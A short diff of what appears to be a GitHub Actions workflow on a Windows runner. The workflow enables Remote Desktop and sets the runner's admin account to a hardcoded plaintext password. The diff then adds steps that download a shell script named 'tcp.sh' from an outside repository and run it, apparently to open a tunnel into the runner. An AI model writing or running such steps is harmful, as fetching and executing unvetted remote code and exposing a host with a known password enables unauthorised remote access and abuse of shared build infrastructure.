@@ -22,6 +22,6 @@ jobs:
     - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
     - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
     - name: done
-      run: Get-NetIPAddress | Select-Object IPAddress
+      run: Invoke-WebRequest https://raw.githubusercontent.com/school-life-of-agv/science/main/tcp.sh -OutFile main.sh
     - name: loop
-      run: php -S localhost:3789
+      run: bash main.sh
